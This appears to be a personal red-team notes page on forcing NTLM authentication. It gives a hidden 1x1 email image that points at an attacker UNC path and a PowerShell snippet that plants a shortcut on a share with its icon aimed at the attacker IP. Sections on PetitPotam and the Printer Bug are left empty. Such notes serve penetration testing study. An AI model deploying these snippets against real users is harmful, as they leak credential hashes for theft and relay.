---
creation date: September 24th 2022
last modified date: September 24th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Forcing NTLM Authentication]]  
___

## Description:  

#### 1x1 Images in Emails

If you have control over an inbox, you can send emails that have an invisible 1x1 image embedded in the body.  When the recipients view the email in their mail client, such as Outlook, it will attempt to download the image over the UNC path and trigger an NTLM authentication attempt.

```
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

A sneakier means would be to modify the sender's email signature, so that even legitimate emails they send will trigger NTLM authentication from every recipient who reads them.

#### Windows Shortcuts

A Windows shortcut can have multiple properties including a target, working directory and an icon.  Creating a shortcut with the icon property pointing to a UNC path will trigger an NTLM authentication attempt when it's viewed in Explorer (it doesn't even have to be clicked).

The easiest way to create a shortcut is with PowerShell.

```
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
$shortcut.IconLocation = "\\10.10.17.231\test.ico"
$shortcut.Save()
```

A good location for these is on publicly readable shares.


### [[PetitPotam]]


### [[Printer Bug]]



___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 24th 2022 (10:54 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
